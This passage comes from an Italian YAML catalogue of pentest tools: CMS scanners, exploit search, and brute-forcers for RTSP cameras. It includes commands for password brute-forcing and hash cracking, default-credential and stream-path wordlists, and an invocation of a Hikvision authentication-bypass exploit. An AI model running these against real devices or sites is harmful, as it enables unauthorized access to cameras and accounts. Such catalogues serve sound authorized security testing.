    Vulnerabile a relay attacks.</p><p><strong>Writeable shares:</strong> Upload malware/webshells.</p><p><strong>Readable
    sensitive shares:</strong> SYSVOL, NETLOGON, backup shares con credentials.</p><p><strong>Guest
    access:</strong> Shares accessibili con guest account.</p><h4 class=\"rt-red\"\
    >OPSEC e mitigazioni</h4><p>Null session testing genera eventi 4624/4625 su target.
    RID cycling è rumoroso e può essere rilevato da volume anomalie. Modern Windows
    (10+/Server 2016+) ha null session disabilitato di default. SMB signing enforcement
    blocca molte tecniche. Best practice: scope limitato, throttling queries, salvare
    evidenze strutturate, documentare tutti accessi per reporting. Mitigazioni difensive:
    disable null session, enable SMB signing, restrict anonymous access, monitor eventi
    4624/4625/529.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Infrastructure",
    "SMB"]
  notes:

- id: "postman"
  name: "Postman"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "app"
  phases: ["01_Information_Gathering"]
  caps: ["api-client", "collections", "environment", "auth-testing"]
  repo: "https://www.postman.com/downloads/"
  desc: "Client API per creare/organizzare richieste, variabili ambiente e collezioni
    condivisibili con test automation e auth support"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Postman</strong> è piattaforma
    completa per API lifecycle: creazione request collections, variabili/environment,
    authentication (Bearer, OAuth2, HMAC), test scripting, monitoring, mock server,
    documentazione e CI/CD integration. In pentest API è fondamentale per recon (mappare
    endpoint), exploitation (riprodurre richieste, fuzz parametri) e regression (monitor
    post-remediation).</p><h4 class=\"rt-purple\">Funzionalità chiave</h4><p><strong>Collections:</strong>
    Organizzare requests in folder gerarchiche con description, examples, test scripts.</p><p><strong>Environments:</strong>
    Variabili switchable (dev/staging/prod) per riuso richieste cross-environment.</p><p><strong>Authentication:</strong><ul><li>Basic
    Auth, Digest, Bearer Token</li><li>OAuth 1.0/2.0 con automatic token refresh</li><li>HMAC
    signatures</li><li>AWS Signature V4</li><li>API key (header/query param)</li></ul></p><p><strong>Pre-request
    Scripts:</strong> JavaScript execution prima di request per:</p><ul><li>Dynamic
    variable generation</li><li>Timestamp/nonce calculation</li><li>Signature computation</li></ul></p><p><strong>Tests:</strong>
    Post-response JavaScript assertions:</p><ul><li>Status code validation</li><li>Response
    time checks</li><li>JSON schema validation</li><li>Data extraction to variables</li></ul></p><p><strong>Mock
    Servers:</strong> Simulate API responses per testing senza backend.</p><p><strong>Documentation:</strong>
    Auto-generate API docs da collections.</p><p><strong>Monitoring:</strong> Scheduled
    collection runs con alerting.</p><h4 class=\"rt-green\">Workflow pentest API</h4><p><strong>1.
    Discovery:</strong> Import OpenAPI/Swagger spec o create manualmente collection
    browsing traffic via proxy.</p><p><strong>2. Environment setup:</strong> Create
    environment con:<br><code>baseUrl: https://api.target.com<br>authToken: {{token}}<br>userId:
    {{userId}}</code></p><p><strong>3. Authentication flow:</strong> Request login
    endpoint, extract token con test script:<br><code>pm.environment.set(\"token\"\
    , pm.response.json().access_token);</code></p><p><strong>4. Fuzzing preparation:</strong>
    Duplicate requests, modify parameters, use collection runner per iterations.</p><p><strong>5.
    Authorization testing:</strong> Test IDOR, privilege escalation cambiando userId/authToken.</p><p><strong>6.
    Regression:</strong> Save collection, run post-fix per verify remediation.</p><h4
    class=\"rt-amber\">Test scripts examples</h4><p><strong>Validate status:</strong></p><pre><code>pm.test(\"\
    Status 200\", () => pm.response.to.have.status(200));</code></pre><p><strong>Extract
    data:</strong></p><pre><code>const resp = pm.response.json();<br>pm.environment.set(\"\
    orderId\", resp.data.id);</code></pre><p><strong>Schema validation:</strong></p><pre><code>pm.test(\"\
    Schema valid\", () => {<br>  pm.response.to.have.jsonSchema(schema);<br>});</code></pre><h4
    class=\"rt-red\">Integration e export</h4><p>Collections esportabili in JSON per
    versioning e sharing. Newman CLI runner per CI/CD integration:<br><code>newman
    run collection.json -e environment.json</code></p><p>Proxy integration: Configure
    Postman proxy settings per routing via Burp per analysis approfondita. Import
    HAR files da browser DevTools per quick collection creation.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "API"]
  notes:

- id: "cmseek-v-1-1-3"
  name: "CMSeeK"
  version: "1.1.3"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["cms-detection", "fingerprint", "deep-scan", "version-detect"]
  repo: "https://github.com/Tuhinshubhra/CMSeeK"
  desc: "Tool riconoscimento e fingerprinting CMS con scansioni guidate per detection
    versione, moduli e potenziali vulnerabilità"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CMSeeK</strong> (CMS
    Detection and Exploitation) rileva CMS, versione, plugin/temi installati e vulnerabilità/misconfiguration
    potenziali. Supporta 180+ CMS con detection engine intelligente e moduli approfondimento
    specifici per platform. Usato in information gathering e initial triage per siti
    CMS-based.</p><h4 class=\"rt-purple\">CMS supportati</h4><p>WordPress, Joomla,
    Drupal, Magento, PrestaShop, OpenCart, vBulletin, phpBB, MyBB, Concrete5, TYPO3,
    DokuWiki, MediaWiki, Moodle, Shopify, Wix, Squarespace, Ghost, Jekyll, Hugo, e
    160+ altri.</p><h4 class=\"rt-purple\">Funzionalità detection</h4><p><strong>Fingerprinting:</strong><ul><li>Meta
    tags analysis</li><li>Generator tags</li><li>Specific file paths (/wp-content/,
    /administrator/)</li><li>Cookies patterns</li><li>HTTP headers</li><li>Response
    signatures</li></ul></p><p><strong>Version detection:</strong> Identifica versione
    specifica via:</p><ul><li>Readme files</li><li>Changelog</li><li>Core file versions</li><li>Database
    leak patterns</li></ul></p><p><strong>Deep scan modules:</strong><ul><li>WordPress:
    Theme/plugin enumeration, user enumeration, XMLRPC check</li><li>Joomla: Component/module
    detection, config leak check</li><li>Drupal: Module enum, update status</li></ul></p><p><strong>Vulnerability
    mapping:</strong> Cross-reference versione detected con CVE database per quick
    vulnerability assessment.</p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Guided
    scan:</strong></p><pre><code>python3 cmseek.py</code><br>Interactive mode con
    prompts</p><p><strong>CLI scan:</strong><br><code>cmseek.py -u https://target.com</code></pre><p><strong>Verbose
    output:</strong></p><pre><code>cmseek.py -u https://target.com -v</code></pre><p><strong>Batch
    scan:</strong></p><pre><code>cmseek.py --list targets.txt</code></pre><p><strong>Follow
    redirects:</strong></p><pre><code>cmseek.py -u https://target.com --follow-redirect</code></pre><p><strong>Custom
    user-agent:</strong></p><pre><code>cmseek.py -u https://target.com -ua \"Custom
    Agent\"</code></pre><h4 class=\"rt-amber\">Workflow integration</h4><p><strong>1.
    Initial detection:</strong> CMSeeK per quick CMS fingerprinting.</p><p><strong>2.
    Deep scanning:</strong> Se WordPress → WPScan, Joomla → JoomScan, Drupal → droopescan
    per analysis approfondita.</p><p><strong>3. Version research:</strong> Search
    CVE database per versione detected.</p><p><strong>4. Exploitation:</strong> Use
    scanner verticali o exploit specifici per vulnerabilità identified.</p><h4 class=\"\
    rt-red\">Limitazioni</h4><p>Detection può fallire su CMS heavily customized o
    hardened. False positive possibili con CMS detection su static sites con similar
    patterns. Tool genera multiple requests rilevabili: limitare su target production.
    Validare finding con scanner dedicati prima di exploitation. Non sempre aggiornato
    con latest CMS versions: complementare con manual verification.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS"]
  notes:

- id: "cmsmap"
  name: "CMSmap"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["cms-scan", "vuln-checks", "wordpress", "joomla", "drupal", "moodle"]
  repo: "https://github.com/dionach/CMSmap"
  desc: "Scanner Python per CMS con autodetect e controlli vulnerabilità comuni su
    WordPress/Joomla/Drupal/Moodle con integration Exploit-DB"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CMSmap</strong> di Dionach
    è scanner Python open source che automatizza rilevamento security flaws nei CMS
    più popolari. Integra vulnerabilità comuni per diversi CMS in single tool. Supporta
    WordPress, Joomla, Drupal e Moodle con autodetect CMS, plugin enumeration e correlation
    Exploit-DB per vulnerability matching.</p><h4 class=\"rt-purple\">Funzionalità
    principali</h4><p><strong>Auto-detection:</strong> Identifica CMS automaticamente
    analizzando fingerprint.</p><p><strong>Plugin enumeration:</strong> Lista plugin/moduli/componenti
    installati con version detection dove possibile.</p><p><strong>Vulnerability checks:</strong>
    Verifica misconfig comuni, default credentials, known vulnerabilities.</p><p><strong>Exploit-DB
    integration:</strong> Correlate version detected con exploit database per immediate
    exploitation paths.</p><p><strong>Dictionary attack:</strong> Low-intensity brute
    force durante scanning (5 attempts per user default).</p><p><strong>Post-exploitation:</strong>
    Password hash cracking con hashcat integration (WordPress/Joomla).</p><h4 class=\"\
    rt-green\">Configurazione</h4><p>Configurare <code>cmsmap.conf</code> per Exploit-DB:</p><p><strong>Con
    Git repo locale:</strong></p><pre><code>[exploitdb]<br>edbtype = GIT<br>edbpath
    = /opt/exploitdb/</code></pre><p><strong>Con pacchetto Debian (Kali):</strong></p><pre><code>[exploitdb]<br>edbtype
    = APT<br>edbpath = /usr/share/exploitdb/</code></pre><h4 class=\"rt-green\">Esempi
    utilizzo</h4><p><strong>Basic scan auto-detect:</strong></p><pre><code>cmsmap.py
    https://target.com</code></pre><p><strong>Force WordPress full scan:</strong></p><pre><code>cmsmap.py
    https://target.com -f W -F --noedb -d</code></pre><p><strong>Batch scanning:</strong></p><pre><code>cmsmap.py
    -i targets.txt -o output.txt</code></pre><p><strong>Brute force:</strong></p><pre><code>cmsmap.py
    https://target.com -u admin -p passwords.txt</code></pre><p><strong>Hash cracking:</strong></p><pre><code>cmsmap.py
    -k hashes.txt -w wordlist.txt</code></pre><p><strong>Verbose con threading:</strong></p><pre><code>cmsmap.py
    https://target.com -v -t 10</code></pre><p><strong>Custom headers:</strong></p><pre><code>cmsmap.py
    https://target.com -H \"Authorization: Bearer token\"</code></pre><h4 class=\"\
    rt-amber\">Opzioni avanzate</h4><p><strong>-F, --fullscan:</strong> Usa large
    plugin lists (slow, false positive possibili).</p><p><strong>-E, --noedb:</strong>
    Enum plugins senza ricerca exploits (faster).</p><p><strong>-d, --dictattack:</strong>
    Low-intensity dictionary attack durante scan.</p><p><strong>-x, --noxmlrpc:</strong>
    WordPress brute force senza XML-RPC.</p><p><strong>-c, --nocleanurls:</strong>
    Disable clean URLs per Drupal only.</p><h4 class=\"rt-red\">Note operative</h4><p>Progetto
    in early state: possibili bug/malfunction. Full scan (-F) è rumoroso e lento:
    usare solo su scope limitato. Dictionary attack genera authentication attempts
    rilevabili: rispettare lockout policy. Mantenere aggiornato Exploit-DB mapping
    con <code>-U P</code> (update plugins) o <code>-U PC</code> (CMSmap e plugins).
    Validare finding con scanner verticali (WPScan, JoomScan) prima di exploitation.
    Usage su target senza consenso è illegale.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS"]
  notes:

- id: "joomlascan"
  name: "JoomlaScan"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["joomla-enum", "components-detect", "fingerprint"]
  repo: "https://github.com/drego85/JoomlaScan"
  desc: "Scanner per componenti Joomla che rileva estensioni esposte, directory indicizzate
    e file per version identification"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JoomlaScan</strong>
    enumera componenti/estensioni di siti Joomla, individua directory indicizzate,
    file utili all'identificazione versione (readme/manifest/changelog) e robots.txt.
    Usato in information gathering per arricchire inventario prima di scanner dedicated
    come JoomScan.</p><h4 class=\"rt-purple\">Funzionalità detection</h4><p><strong>Component
    enumeration:</strong> Identifica componenti installati via path standard:</p><ul><li>/components/com_*/</li><li>/administrator/components/com_*/</li></ul><p><strong>Module/Plugin
    detection:</strong> Enum moduli e plugin accessibili.</p><p><strong>Version fingerprinting:</strong>
    Cerca file che rivelano versione:</p><ul><li>README.txt</li><li>CHANGELOG.txt</li><li>manifest.xml</li><li>/language/en-GB/en-GB.xml</li></ul></p><p><strong>Directory
    listing:</strong> Verifica directory con indexing abilitato per file disclosure.</p><p><strong>robots.txt
    analysis:</strong> Parse per path interessanti disallowed.</p><h4 class=\"rt-green\"\
    >Utilizzo</h4><p><strong>Basic scan:</strong></p><pre><code>python joomlascan.py
    -u https://target.com</code></pre><p><strong>Con threading:</strong></p><pre><code>python
    joomlascan.py -u https://target.com -t 10</code></pre><p><strong>Verbose output:</strong></p><pre><code>python
    joomlascan.py -u https://target.com -v</code></pre><p><strong>Output su file:</strong></p><pre><code>python
    joomlascan.py -u https://target.com -o results.txt</code></pre><h4 class=\"rt-amber\"\
    >Workflow completo</h4><p><strong>1. Initial scan:</strong> JoomlaScan per enum
    componenti e version detection.</p><p><strong>2. Deduplication:</strong> Rimuovere
    duplicati e false positive dall'output.</p><p><strong>3. CVE research:</strong>
    Search vulnerabilità per component/version identificati.</p><p><strong>4. Deep
    scan:</strong> Usare JoomScan (scanner diverso, più completo) per analysis approfondita.</p><p><strong>5.
    Validation:</strong> Verificare componenti emersi con accesso manuale.</p><h4
    class=\"rt-red\">Best practice</h4><p>Salvare output per diff tra scan successive.
    Deduplicare host/subpath prima di validation manuale. Integrare risultati con
    feed CVE e scanner verticali. Non sostituisce JoomScan completo ma offre quick
    triage. Validare componenti emersi con accesso manuale per evitare false positive.
    Tool specifico per Joomla: usare CMSmap o CMSeeK per detection multi-CMS.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "CMS", "Joomla"]
  notes:

- id: "katana-linux-amd64"
  name: "katana_linux_amd64"
  version: "1.2.2"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["crawler", "spider", "javascript-aware", "sitemap"]
  repo: "https://github.com/projectdiscovery/katana"
  desc: "Crawler web rapido (ProjectDiscovery) con estrazione endpoint, JS, subpath;
    output per fuzzing/ASSETs."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Katana è un crawler web veloce
    e modulare. Estrae URL, endpoint API, link in JS, form e subpath utili a fuzzing
    e mapping d’applicazioni. Integra filtri, scope control e output in formati standard
    per pipeline offensive.</p><h4 class=\"rt-blue\">Funzioni chiave</h4><ul><li>Parsing
    di HTML/JS, rilevazione endpoint e tecnologie.</li><li>Regole di scope, rate‑limit,
    depth e deduplica.</li><li>Output JSON/STDOUT integrabile con nuclei/ffuf/httpx.</li></ul><h4
    class=\"rt-blue\">Uso e OPSEC</h4><p>Limitare lo scope, rispettare robots e impostare
    throttle per evitare eccessivo rumore nei log target.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "02_Enumeration", "Web", "Crawling",
    "Active"]
  notes:

- id: "findsploit-2-0"
  name: "Findsploit"
  version: "2.0"
  icon: "../app/icons/github.svg"
  kind: "framework"
  phases: ["02_Exploitation"]
  caps: ["exploit-search", "cve-mapping", "aux-suggest"]
  repo: "https://github.com/1N3/Findsploit"
  desc: "Wrapper CLI che interroga multiple fonti (Exploit-DB/Metasploit/GitHub) per
    ricerca PoC ed exploit da keyword/versioni/CVE"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Findsploit</strong>
    automatizza ricerca exploit/moduli in Exploit-DB, Metasploit e script Nmap. Accelera
    passaggio da vulnerability-id a tecnica praticabile con suggerimenti su moduli
    correlati. Comandi: <code>findsploit &lt;term&gt;</code>, categorie (exploits,
    payloads, nmap), copia rapida PoC (copysploit), build/exec (compilesploit).</p><h4
    class=\"rt-purple\">Fonti interrogate</h4><p><strong>Exploit-DB:</strong> Database
    pubblico di exploit verificati.</p><p><strong>Metasploit Framework:</strong> Moduli
    exploit, auxiliary, post-exploitation.</p><p><strong>Nmap NSE:</strong> Script
    per detection/exploitation vulnerabilità.</p><p><strong>GitHub:</strong> Repository
    pubblici con PoC e tool.</p><h4 class=\"rt-green\">Comandi principali</h4><p><strong>Ricerca
    base:</strong></p><pre><code>findsploit apache 2.4</code></pre><p><strong>Per
    CVE:</strong></p><pre><code>findsploit CVE-2021-44228</code></pre><p><strong>Lista
    categorie:</strong></p><pre><code>findsploit --list exploits</code><br><code>findsploit
    --list payloads</code></pre><p><strong>Copia exploit:</strong></p><pre><code>copysploit
    12345</code> (copia exploit ID in working directory)</p><p><strong>Compile e run:</strong><br><code>compilesploit
    exploit.c</code></pre><p><strong>Update database:</strong></p><pre><code>findsploit
    update</code></pre><h4 class=\"rt-amber\">Workflow tipico</h4><p><strong>1. Vulnerability
    research:</strong> Da CVE o software version a exploit disponibili.</p><p><strong>2.
    PoC selection:</strong> Filtrare risultati per platform/language rilevanti.</p><p><strong>3.
    Local copy:</strong> Usare copysploit per ottenere exploit code.</p><p><strong>4.
    Testing:</strong> Validare PoC in ambiente isolato prima di produzione.</p><p><strong>5.
    Documentation:</strong> Referenziare exploit ID in report per reproducibility.</p><h4
    class=\"rt-red\">Best practice</h4><p>Eseguire <code>findsploit update</code>
    regolarmente per database aggiornati. Validare PoC in lab isolato: exploit pubblici
    possono contenere malware o essere unreliable. Rispettare scoping e TOU durante
    testing. Preferire Metasploit modules quando disponibili per stabilità. GitHub
    results richiedono code review prima di execution. Documentare exploit source
    e version per reporting compliance.</p>"
  best_in: true
  category_path: ["02_Exploitation", "General"]
  notes:

- id: "cameradar-5-0-4"
  name: "cameradar"
  version: "5.0.4"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["rtsp-scan", "route-bruteforce", "creds-attack", "docker"]
  repo: "https://github.com/Ullaakut/cameradar"
  desc: "Scanner/attacker RTSP che individua stream, tenta credenziali/route noti
    per esporre feed video con workflow scan→attack→print integrato"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cameradar</strong> scansiona
    subnet/IP/Range e tenta accesso a stream RTSP enumerando path comuni e provando
    credenziali note. Fornisce binario standalone, Docker image e libreria Go. Workflow:
    scan → attack → print streams. Nota: digest auth support dipende da libcurl version.</p><h4
    class=\"rt-purple\">Funzionalità</h4><p><strong>Discovery:</strong> Scan porte
    RTSP comuni (554, 8554, 5554) su network ranges.</p><p><strong>Route bruteforce:</strong>
    Testa path RTSP comuni da wordlist:<br>/live.sdp, /Streaming/Channels/101, /h264,
    /cam/realmonitor, /1, /onvif1</p><p><strong>Credential attack:</strong> Prova
    username/password combinations da dizionario:<br>admin:admin, admin:12345, root:root,
    admin:, etc.</p><p><strong>Authentication:</strong> Supporta Basic e Digest (se
    libcurl compilato con support).</p><p><strong>Stream validation:</strong> Verifica
    stream accessibili e estrae metadata.</p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Docker
    (raccomandato):</strong></p><pre><code>docker run -t ullaakut/cameradar -t &lt;target&gt;</code></pre><p><strong>Scan
    subnet:</strong></p><pre><code>docker run -t ullaakut/cameradar -t 192.168.1.0/24</code></pre><p><strong>Porta
    custom:</strong></p><pre><code>docker run -t ullaakut/cameradar -t target -p 8554</code></pre><p><strong>Custom
    wordlists:</strong></p><pre><code>cameradar -t target -r routes.txt -c credentials.json</code></pre><p><strong>Binary
    standalone:</strong></p><pre><code>cameradar scan -t 192.168.1.0/24<br>cameradar
    attack -t results.json</code></pre><h4 class=\"rt-amber\">Wordlist customization</h4><p>Cameradar
    include default wordlists ma supporta custom:<br><strong>Routes:</strong> <code>routes.txt</code>
    con path RTSP uno per linea.<br><strong>Credentials:</strong> JSON format:<br><code>[<br>\
    \  {\"username\": \"admin\", \"password\": \"admin\"},<br>  {\"username\": \"\
    root\", \"password\": \"12345\"}<br>]</code></p><h4 class=\"rt-red\">Considerazioni
    operative</h4><p>Usare wordlist aggiornate per routes/credenziali manufacturer-specific.
    Limitare scope scanning a subnet autorizzati. Salvare risultati per documentation.
    Testing su DVR/IP camera production può causare instability: preferire finestre
    manutenzione. Validare stream trovati con player (VLC, ffmpeg) prima di assumere
    accessibility completa. Digest auth richiede libcurl con CURLAUTH_DIGEST: verificare
    build dependencies. Operare solo su target autorizzati: unauthorized camera access
    è reato.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "hikpwn"
  name: "HikPwn"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["hikvision-enum", "vuln-checks", "active-scan"]
  repo: "https://github.com/4n4nk3/HikPwn"
  desc: "Scanner dedicato device Hikvision con enum attiva/passiva, check porte/servizi
    e verification vulnerabilità note (ICSA-17-124-01)"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HikPwn</strong> effettua
    discovery passivo e probing UPnP per individuare device Hikvision, estrae info
    (modello/firmware) e verifica exploit ICSA-17-124-01 con possibilità escalation
    ad accesso admin. Fasi: recon e exploitation. Isolare rete test, registrare log
    (./log.txt) e verificare impatto pre-azioni invasive.</p><h4 class=\"rt-purple\"\
    >Modalità discovery</h4><p><strong>Passive UPnP:</strong> Ascolta broadcast UPnP
    per device Hikvision che annunciano presenza.</p><p><strong>Active probing:</strong>
    Interroga direttamente IP specifici per service fingerprinting.</p><p><strong>Port
    scanning:</strong> Verifica porte comuni Hikvision (80, 443, 554, 8000, 8080).</p><h4
    class=\"rt-green\">Utilizzo</h4><p><strong>Passive discovery:</strong></p><pre><code>python
    hikpwn.py --interface eth0</code></pre><p><strong>Active scan IP specifico:</strong></p><pre><code>python
    hikpwn.py --interface eth0 --address 192.168.1.100 --active</code></pre><p><strong>Exploit
    ICSA-17-124-01:</strong></p><pre><code>python hikpwn.py --interface eth0 --address
    192.168.1.100 --ICSA_17_124_01</code></pre><p><strong>Full scan con exploit:</strong></p><pre><code>python
    hikpwn.py --interface eth0 --address 192.168.1.0/24 --active --ICSA_17_124_01</code></pre><h4
    class=\"rt-amber\">ICSA-17-124-01 vulnerability</h4><p>Vulnerabilità authentication
    bypass in device Hikvision che permette:</p><ul><li>Reset password admin via crafted
    request</li><li>Accesso completo configurazione device</li><li>Modifica settings
    sicurezza</li><li>Accesso stream video senza auth</li></ul><p>Affetti: numerosi
    modelli DVR/NVR/IP camera Hikvision pre-2017.</p><h4 class=\"rt-red\">Considerazioni
    sicurezza</h4><p>Exploit ICSA-17-124-01 è invasivo: modifica configurazione device.
    Testare solo in ambiente isolato con approval esplicito. Salvare configurazione
    originale prima di exploitation. Device compromessi potrebbero richiedere factory
    reset per remediation. Log output in ./log.txt per audit trail. Vulnerability
    patchata in firmware post-2017: verificare version prima di test. HikPwn è PoC
    educazionale: uso production richiede cautela estrema. Coordinare con owner device
    per minimizzare downtime e rischi operativi.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtsp-routes-wordlist"
  name: "routes_wordlist.txt"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["02_Exploitation"]
  caps: ["rtsp-routes", "content-discovery"]
  repo: ""
  desc: "Wordlist percorsi RTSP comuni (/live.sdp, /Streaming/Channels/101, /h264)
    per brute-force mount point nascosti su stream video"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Wordlist curata di path RTSP
    comuni facilita enumerazione rapida stream quando endpoint risponde ma non pubblica
    indice o nasconde mount point. Pattern comuni: /live.sdp, /Streaming/Channels/101,
    /h264, /cam/realmonitor, /1, /axis-media/media.amp, /onvif1, /stream1, /video.mjpg.</p><h4
    class=\"rt-purple\">Utilizzo con tool</h4><p><strong>Nmap NSE:</strong></p><pre><code>nmap
    --script rtsp-url-brute --script-args rtsp-url-brute.urlfile=routes.txt -p 554
    &lt;ip&gt;</code></pre><p><strong>Cameradar:</strong></p><pre><code>cameradar
    -t target -r routes_wordlist.txt</code></pre><p><strong>Custom script:</strong></p><pre><code>while
    read route; do<br>  ffprobe rtsp://target:554$route 2>&1 | grep -q \"Stream #0\"\
    \ && echo \"Found: $route\"<br>done &lt; routes_wordlist.txt</code></pre><h4 class=\"\
    rt-green\">Pattern manufacturer</h4><p><strong>Hikvision:</strong> /Streaming/Channels/101,
    /Streaming/Channels/1, /h264/ch1/main/av_stream</p><p><strong>Dahua:</strong>
    /cam/realmonitor?channel=1&subtype=0, /live/ch00_0</p><p><strong>Axis:</strong>
    /axis-media/media.amp, /mpeg4/media.amp, /mjpg/video.mjpg</p><p><strong>Foscam:</strong>
    /videoMain, /11, /12</p><p><strong>Generic:</strong> /live.sdp, /stream1, /video1,
    /1, /h264</p><h4 class=\"rt-amber\">Best practice</h4><p>Combinare con credenziali
    default per coverage completa. Limitare thread/timeout per non overload device
    embedded. Filtrare false positive 401/404 distinguendo da 200/unauthorized differenti.
    Testare anche porte non-standard (8554, 5554). Verificare stream trovati con player/ffmpeg
    prima di assumption accessibility. Integrare risultati con screenshot/recording
    per documentation visuale. Manufacturer-specific routes hanno higher success rate:
    prioritizzare in base a fingerprint device.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtsp-authgrinder"
  name: "rtsp_authgrinder"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["rtsp-bruteforce", "basic-digest", "multi-thread"]
  repo: "https://github.com/tektengu/rtsp_authgrinder"
  desc: "Brute-forcer credenziali RTSP con supporto Basic auth e multi-threading per
    DVR/IP-cam quando route stream è noto"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rtsp_authgrinder</strong>
    esegue brute-force su autenticazioni RTSP di tipo 'Basic' con thread multipli.
    Dalla repo emerge che il supporto 'Digest' non è implementato; serve specificare
    target e liste di utenti/password. Si usa in 'credential testing' per validare
    igiene delle password su DVR/IP camera quando il percorso dello stream è noto
    o enumerato.</p><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Multi-threading:</strong>
    Esecuzione concorrente per velocizzare test su wordlist ampie.</p><p><strong>Basic
    Authentication:</strong> Supporto completo per RTSP Basic auth, metodo più comune
    su dispositivi legacy.</p><p><strong>Target flexibility:</strong> Accetta liste
    di target, percorsi stream e combinazioni utente/password.</p><h4 class=\"rt-green\"\
    >Utilizzo</h4><p><strong>Basic usage:</strong></p><pre><code>python rtsp_authgrinder.py
    -t rtsp://target:554/stream -u users.txt -p passwords.txt</code></pre><p><strong>Con
    threading:</strong></p><pre><code>rtsp_authgrinder.py -t target_list.txt -u users.txt
    -p passwords.txt -w 10</code></pre><h4 class=\"rt-amber\">Best practice</h4><p>Limitare
    concorrenza su dispositivi embedded (max 5-10 thread). Rispettare rate-limit del
    device per evitare crash. Monitorare risposte 401/200 per discriminare successi.
    Considerare alternative moderne (hydra, nmap rtsp-url-brute) per scenari Digest
    o reporting avanzato.</p><h4 class=\"rt-red\">Note operative</h4><p>Tool specifico
    per Basic auth: verificare supporto authentication del target prima. Dispositivi
    RTSP possono avere lockout o reboot su tentativi eccessivi. Coordinare timing
    con finestre di test autorizzate. Output strutturato facilita parsing per reporting
    e integrazione con altri tool di exploitation.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtsp-crack-1-0-3"
  name: "rtsp_crack"
  version: "1.0.3"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["rtsp-bruteforce", "gui", "digest-support"]
  repo: ""
  desc: "Bruteforcer/enum per endpoint RTSP: prova percorsi e credenziali comuni per
    individuare stream accessibili."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Strumento per individuare e
    forzare accessi a stream RTSP: scandisce host/porte, tenta percorsi noti e credenziali
    di default o wordlist, generando evidenze e URL riproducibili.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Scansione multiprotocollo sulle porte 554/8554.</li><li>Bruteforce
    di path (rtsp-url-brute) e Basic/Digest auth.</li><li>Reportistica con elenco
    stream e screenshot opzionali.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Rispettare
    limiti legali; molti dispositivi espongono stream sensibili. Limitare i thread
    e usare scope autorizzato.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtsp-digest-auth-bruteforcer"
  name: "RTSP-Digest-Auth-Bruteforcer"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["digest-bruteforce", "header-crafting"]
  repo: ""
  desc: "PoC/utility per forzare autenticazione Digest su server RTSP con wordlist
    e supporto multi‑thread."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Utility focalizzata su RTSP
    Digest: esegue tentativi paralleli su combinazioni user/password e verifica l’accesso
    allo stream o il codice di stato, utile per assessment di IoT/CCTV.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>Supporto Digest (RFC 2069/2617) e Basic.</li><li>Gestione
    wordlist e percorsi stream.</li><li>Timeout/jitter configurabili per ridurre il
    rumore.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire solo su infrastrutture
    autorizzate; monitorare account lockout e impatto di rete.</p>"
  best_in: true
  category_path: ["02_Exploitation", "Infrastructure", "RTSP"]
  notes:

- id: "rtsp-findingsomefun"
  name: "RTSP-FindingSomeFun"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["02_Exploitation"]
  caps: ["mass-scan", "bruteforce", "wordlist-combos"]
  repo: "https://github.com/ThatNotEasy/RTSP-FindingSomeFun"
  desc: "Scanner/Bruteforcer massivo per RTSP con multithreading e wordlist per individuare
    stream su IP list."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Esegue scansioni massicce di
    indirizzi per RTSP, tentando credenziali e percorsi con thread paralleli. Produce
    output tabellare con stream scoperti e stati di autenticazione.</p><h4 class=\"\
